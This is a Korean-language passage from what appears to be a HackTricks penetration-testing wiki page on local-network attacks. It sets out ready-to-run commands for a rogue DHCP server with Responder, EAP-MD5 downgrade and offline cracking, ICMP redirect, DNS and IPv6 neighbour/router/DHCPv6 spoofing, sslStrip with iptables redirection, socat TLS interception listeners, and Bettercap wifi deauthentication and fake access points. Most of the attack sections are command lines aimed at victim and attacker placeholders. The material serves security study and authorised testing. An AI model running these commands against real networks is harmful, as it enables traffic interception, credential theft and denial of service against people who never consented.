언급된 DoS 공격을 사용하여 클라이언트가 환경 내에서 새로운 임대 계약을 얻도록 강제하고, 합법적인 서버를 소진시켜 응답하지 않도록 만들 수 있습니다. 그래서 합법적인 서버가 다시 연결을 시도할 때, **다음 공격에서 언급된 악의적인 값을 제공할 수 있습니다**.

#### 악의적인 값 설정

악성 DHCP 서버는 `/usr/share/responder/DHCP.py`에 위치한 DHCP 스크립트를 사용하여 설정할 수 있습니다. 이는 HTTP 트래픽과 자격 증명을 캡처하기 위해 트래픽을 악성 서버로 리디렉션하는 네트워크 공격에 유용합니다. 그러나 악성 게이트웨이를 설정하는 것은 클라이언트의 아웃바운드 트래픽만 캡처할 수 있어 실제 게이트웨이의 응답을 놓치기 때문에 덜 효과적입니다. 대신, 보다 효과적인 공격을 위해 악성 DNS 또는 WPAD 서버를 설정하는 것이 권장됩니다.

아래는 악성 DHCP 서버를 구성하기 위한 명령 옵션입니다:

- **우리의 IP 주소 (게이트웨이 광고)**: `-i 10.0.0.100`을 사용하여 머신의 IP를 게이트웨이로 광고합니다.
- **로컬 DNS 도메인 이름**: 선택적으로 `-d example.org`를 사용하여 로컬 DNS 도메인 이름을 설정합니다.
- **원래 라우터/게이트웨이 IP**: `-r 10.0.0.1`을 사용하여 합법적인 라우터 또는 게이트웨이의 IP 주소를 지정합니다.
- **주 DNS 서버 IP**: `-p 10.0.0.100`을 사용하여 제어하는 악성 DNS 서버의 IP 주소를 설정합니다.
- **보조 DNS 서버 IP**: 선택적으로 `-s 10.0.0.1`을 사용하여 보조 DNS 서버 IP를 설정합니다.
- **로컬 네트워크의 넷마스크**: `-n 255.255.255.0`을 사용하여 로컬 네트워크의 넷마스크를 정의합니다.
- **DHCP 트래픽을 위한 인터페이스**: `-I eth1`을 사용하여 특정 네트워크 인터페이스에서 DHCP 트래픽을 수신합니다.
- **WPAD 구성 주소**: `-w “http://10.0.0.100/wpad.dat”`를 사용하여 웹 트래픽 가로채기를 지원하는 WPAD 구성 주소를 설정합니다.
- **기본 게이트웨이 IP 스푸핑**: 기본 게이트웨이 IP 주소를 스푸핑하기 위해 `-S`를 포함합니다.
- **모든 DHCP 요청에 응답**: 모든 DHCP 요청에 응답하도록 서버를 설정하기 위해 `-R`을 포함하지만, 이는 소음이 많고 탐지될 수 있음을 유의해야 합니다.

이 옵션들을 올바르게 사용함으로써, 악성 DHCP 서버를 설정하여 네트워크 트래픽을 효과적으로 가로챌 수 있습니다.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP 공격**

다음은 802.1X 구현에 대해 사용할 수 있는 공격 전술입니다:

- EAP를 통한 능동적인 무차별 대입 비밀번호 공격
- 잘못된 EAP 콘텐츠로 RADIUS 서버 공격 _\*\*_(취약점)
- EAP 메시지 캡처 및 오프라인 비밀번호 크래킹 (EAP-MD5 및 PEAP)
- TLS 인증서 검증을 우회하기 위해 EAP-MD5 인증 강제
- 허브 또는 유사한 장치를 사용하여 인증 시 악성 네트워크 트래픽 주입

공격자가 피해자와 인증 서버 사이에 있다면, 그는 필요에 따라 인증 프로토콜을 EAP-MD5로 저하시키고 인증 시도를 캡처할 수 있습니다. 그런 다음, 그는 이를 무차별 대입으로 공격할 수 있습니다:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol)은 **핫 중복 라우팅 시스템을 생성하기 위해 설계된 네트워크 프로토콜 클래스**입니다. FHRP를 사용하면 물리적 라우터를 단일 논리 장치로 결합할 수 있어 내결함성이 증가하고 부하 분산에 도움이 됩니다.

**Cisco Systems 엔지니어는 GLBP와 HSRP라는 두 가지 FHRP 프로토콜을 개발했습니다.**

{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

라우팅 정보 프로토콜(RIP)의 세 가지 버전이 존재하는 것으로 알려져 있습니다: RIP, RIPv2, RIPng. RIP와 RIPv2는 UDP를 사용하여 포트 520을 통해 피어에게 데이터그램을 전송하며, RIPng는 IPv6 멀티캐스트를 통해 UDP 포트 521로 데이터그램을 브로드캐스트합니다. RIPv2는 MD5 인증을 지원합니다. 반면, RIPng는 기본 인증을 포함하지 않으며, 대신 IPv6 내에서 선택적 IPsec AH 및 ESP 헤더에 의존합니다.

- **RIP 및 RIPv2:** 통신은 포트 520에서 UDP 데이터그램을 통해 이루어집니다.
- **RIPng:** IPv6 멀티캐스트를 통해 데이터그램을 브로드캐스트하기 위해 UDP 포트 521을 사용합니다.

RIPv2는 MD5 인증을 지원하는 반면, RIPng는 기본 인증을 포함하지 않고 IPv6에서 IPsec AH 및 ESP 헤더에 의존합니다.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)**는 동적 라우팅 프로토콜입니다. **거리 벡터 프로토콜입니다.** **인증**이 없고 수동 인터페이스가 구성되지 않은 경우, **침입자**가 EIGRP 라우팅에 간섭하고 **라우팅 테이블을 오염**시킬 수 있습니다. 또한, EIGRP 네트워크(즉, 자율 시스템)는 **평면이며 어떤 구역으로도 분할되지 않습니다**. **공격자가 경로를 주입하면**, 이 경로가 자율 EIGRP 시스템 전반에 **퍼질 가능성이 높습니다**.

EIGRP 시스템을 공격하려면 **합법적인 EIGRP 라우터와 이웃을 설정해야** 하며, 이는 기본 정찰에서 다양한 주입에 이르기까지 많은 가능성을 열어줍니다.

[**FRRouting**](https://frrouting.org/)은 **BGP, OSPF, EIGRP, RIP 및 기타 프로토콜을 지원하는 가상 라우터를 구현할 수 있게 해줍니다.** 이를 공격자의 시스템에 배포하기만 하면 실제로 라우팅 도메인에서 합법적인 라우터인 척할 수 있습니다.

{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/)는 EIGRP (Enhanced Interior Gateway Routing Protocol) 브로드캐스트를 가로채는 기능을 가지고 있습니다. 또한 패킷 주입을 허용하여 라우팅 구성을 변경하는 데 사용할 수 있습니다.

### OSPF

Open Shortest Path First (OSPF) 프로토콜에서는 **라우터 간의 안전한 통신을 보장하기 위해 MD5 인증이 일반적으로 사용됩니다**. 그러나 이 보안 조치는 Loki 및 John the Ripper와 같은 도구를 사용하여 손상될 수 있습니다. 이러한 도구는 MD5 해시를 캡처하고 해독할 수 있어 인증 키를 노출시킵니다. 이 키를 얻으면 새로운 라우팅 정보를 도입하는 데 사용할 수 있습니다. 경로 매개변수를 구성하고 손상된 키를 설정하기 위해 각각 _Injection_ 및 _Connection_ 탭이 사용됩니다.

- **MD5 해시 캡처 및 해독:** Loki 및 John the Ripper와 같은 도구가 사용됩니다.
- **경로 매개변수 구성:** _Injection_ 탭을 통해 이루어집니다.
- **손상된 키 설정:** 키는 _Connection_ 탭에서 구성됩니다.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): 네트워크 트래픽을 스캔하고 취약점을 찾는 도구
- **네트워크 공격에 대한 더 많은 정보**는 [**여기**](https://github.com/Sab0tag3d/MITM-cheatsheet)에서 찾을 수 있습니다.

## **Spoofing**

공격자는 가짜 DHCP 응답을 보내 네트워크의 새로운 구성원의 모든 네트워크 매개변수(GW, IP, DNS)를 구성합니다.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP 스푸핑

[이전 섹션](./#arp-spoofing)을 확인하세요.

### ICMP 리다이렉트

ICMP 리다이렉트는 공격자가 IP에 도달하는 가장 좋은 방법임을 나타내는 ICMP 패킷 유형 1 코드 5를 전송하는 것입니다. 그런 다음 피해자가 IP에 연락하고자 할 때 패킷을 공격자를 통해 전송하게 됩니다.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

공격자는 피해자가 요청하는 일부(또는 모든) 도메인을 해결할 것입니다.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasq로 자체 DNS 구성**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### 로컬 게이트웨이

시스템 및 네트워크에 대한 여러 경로가 종종 존재합니다. 로컬 네트워크 내에서 MAC 주소 목록을 작성한 후, _gateway-finder.py_를 사용하여 IPv4 포워딩을 지원하는 호스트를 식별합니다.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

DNS 조회가 실패할 때 로컬 호스트 해상도를 위해 Microsoft 시스템은 **Link-Local Multicast Name Resolution (LLMNR)** 및 **NetBIOS Name Service (NBT-NS)**에 의존합니다. 유사하게, **Apple Bonjour** 및 **Linux zero-configuration** 구현은 네트워크 내 시스템을 발견하기 위해 **Multicast DNS (mDNS)**를 사용합니다. 이러한 프로토콜의 인증되지 않은 특성과 UDP를 통한 메시지 브로드캐스팅으로 인해 공격자는 사용자를 악성 서비스로 리디렉션하기 위해 이를 악용할 수 있습니다.

Responder를 사용하여 호스트가 검색하는 서비스를 가장하여 가짜 응답을 보낼 수 있습니다.\
[Responder로 서비스를 가장하는 방법에 대한 더 많은 정보는 여기에서 확인하세요](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

브라우저는 **Web Proxy Auto-Discovery (WPAD) 프로토콜을 사용하여 프록시 설정을 자동으로 획득합니다**. 이는 "http://wpad.example.org/wpad.dat"와 같은 URL을 통해 서버에서 구성 세부정보를 가져오는 것을 포함합니다. 클라이언트가 이 서버를 발견하는 방법은 여러 가지가 있습니다:

- **DHCP**를 통해, 여기서 발견은 특별한 코드 252 항목을 사용하여 촉진됩니다.
- **DNS**를 통해, 이는 로컬 도메인 내에서 _wpad_라는 호스트 이름을 검색하는 것을 포함합니다.
- **Microsoft LLMNR 및 NBT-NS**를 통해, 이는 DNS 조회가 실패할 경우 사용되는 대체 메커니즘입니다.

도구 Responder는 **악성 WPAD 서버**로 작동하여 이 프로토콜을 이용합니다. DHCP, DNS, LLMNR 및 NBT-NS를 사용하여 클라이언트를 속여 자신에게 연결하도록 유도합니다. Responder를 사용하여 서비스를 가장하는 방법에 대해 더 깊이 알아보려면 [여기를 확인하세요](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

네트워크에서 다양한 서비스를 제공하여 **사용자를 속여 일부 **평문 자격 증명**을 입력하도록 시도할 수 있습니다. **이 공격에 대한 더 많은 정보는** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**에서 확인하세요.**

### IPv6 Neighbor Spoofing

이 공격은 ARP Spoofing과 매우 유사하지만 IPv6 세계에서 발생합니다. 피해자가 GW의 IPv6가 공격자의 MAC을 가지고 있다고 생각하게 만들 수 있습니다.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 라우터 광고 스푸핑/플러딩

일부 OS는 네트워크에서 전송된 RA 패킷으로부터 기본적으로 게이트웨이를 구성합니다. 공격자를 IPv6 라우터로 선언하려면 다음을 사용할 수 있습니다:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP 스푸핑

기본적으로 일부 운영 체제는 네트워크에서 DHCPv6 패킷을 읽어 DNS를 구성하려고 합니다. 그런 다음 공격자는 자신을 DNS로 구성하기 위해 DHCPv6 패킷을 보낼 수 있습니다. DHCP는 또한 피해자에게 IPv6를 제공합니다.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (가짜 페이지 및 JS 코드 주입)

## 인터넷 공격

### sslStrip

기본적으로 이 공격은 **사용자**가 **HTTPS** 버전으로 **리디렉션**되는 **HTTP** 페이지에 **접근**하려고 할 때 발생합니다. **sslStrip**는 **클라이언트와**의 **HTTP 연결**과 **서버와**의 **HTTPS 연결**을 **유지**하여 **일반 텍스트**로 연결을 **스니핑**할 수 있게 합니다.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
더 많은 정보는 [여기](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf)에서 확인하세요.

### sslStrip+ 및 dns2proxy를 통한 HSTS 우회

**sslStrip+와 dns2proxy**의 **차이점**은 **sslStrip**에 비해 **예를 들어 _**www.facebook.com**_을 _**wwww.facebook.com**_으로 **리다이렉트**한다는 것입니다** (여기서 **추가된** "**w**"에 주목하세요) 그리고 **이 도메인의 주소를 공격자 IP로 설정**합니다. 이렇게 하면 **클라이언트**는 _**wwww.facebook.com**_ **(공격자)**에 **연결**하지만, 뒤에서는 **sslstrip+**가 **www.facebook.com**과의 **실제 연결**을 **유지**합니다.

이 기술의 **목표**는 **HSTS를 피하는 것**입니다. 왜냐하면 _**wwww**.facebook.com_ **은** 브라우저의 **캐시에** 저장되지 않기 때문에 브라우저는 **HTTP로 facebook 인증을 수행하도록 속일 수 있습니다**.\
이 공격을 수행하기 위해서는 피해자가 처음에 [http://www.faceook.com](http://www.faceook.com)에 접근해야 하며, https가 아니어야 합니다. 이는 http 페이지 내의 링크를 수정하여 수행할 수 있습니다.

더 많은 정보는 [여기](https://www.bettercap.org/legacy/#hsts-bypass), [여기](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) 및 [여기](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly)에서 확인하세요.

**sslStrip 또는 sslStrip+는 더 이상 작동하지 않습니다. 이는 브라우저에 HSTS 규칙이 미리 저장되어 있기 때문입니다. 따라서 사용자가 "중요한" 도메인에 처음 접근하더라도 HTTPS를 통해 접근하게 됩니다. 또한, 미리 저장된 규칙과 다른 생성된 규칙은** [**`includeSubdomains`**](https://hstspreload.appspot.com) **플래그를 사용할 수 있으므로, 이전의 _**wwww.facebook.com**_ 예시는 _**facebook.com**_이 `includeSubdomains`와 함께 HSTS를 사용하기 때문에 더 이상 작동하지 않습니다.**

TODO: easy-creds, evilgrade, metasploit, factory

## 포트에서 TCP 수신
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL 포트에서 수신

#### 키 및 자체 서명된 인증서 생성
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 인증서를 사용하여 수신 대기
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 인증서를 사용하여 수신하고 호스트로 리디렉션
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
때때로 클라이언트가 CA가 유효한지 확인하면, **CA에 의해 서명된 다른 호스트 이름의 인증서를 제공할 수 있습니다**.\
또 다른 흥미로운 테스트는 **요청된 호스트 이름의 인증서를 제공하지만 자체 서명된** 것입니다.

테스트할 다른 사항은 유효한 CA가 아닌 유효한 인증서로 인증서에 서명하려고 시도하는 것입니다. 또는 유효한 공개 키를 사용하고, 실제 개인 키로 아무것도 복호화할 필요가 없는 알고리즘인 디피 헬만을 강제로 사용하며, 클라이언트가 실제 개인 키의 프로브(예: 해시)를 요청할 때 가짜 프로브를 보내고 클라이언트가 이를 확인하지 않기를 기대하는 것입니다.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Active Discovery Notes

UDP 패킷이 요청된 포트가 없는 장치로 전송될 때 ICMP (Port Unreachable)가 전송된다는 점을 고려하세요.

### **ARP discover**

ARP 패킷은 네트워크 내에서 사용 중인 IP를 발견하는 데 사용됩니다. PC는 가능한 각 IP 주소에 대해 요청을 보내야 하며, 사용 중인 IP만 응답합니다.

### **mDNS (multicast DNS)**

Bettercap은 **\_services\_.dns-sd.\_udp.local**에 대한 MDNS 요청을 (매 X ms마다) 전송하며, 이 패킷을 보는 머신은 일반적으로 이 요청에 응답합니다. 그런 다음 "services"에 응답하는 머신만 검색합니다.

**Tools**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap은 이름 "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA"를 요청하는 패킷을 포트 137/UDP로 브로드캐스트합니다.

### **SSDP (Simple Service Discovery Protocol)**

Bettercap은 모든 종류의 서비스를 검색하기 위해 SSDP 패킷을 브로드캐스트합니다 (UDP 포트 1900).

### **WSD (Web Service Discovery)**

Bettercap은 서비스를 검색하기 위해 WSD 패킷을 브로드캐스트합니다 (UDP 포트 3702).

## References

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
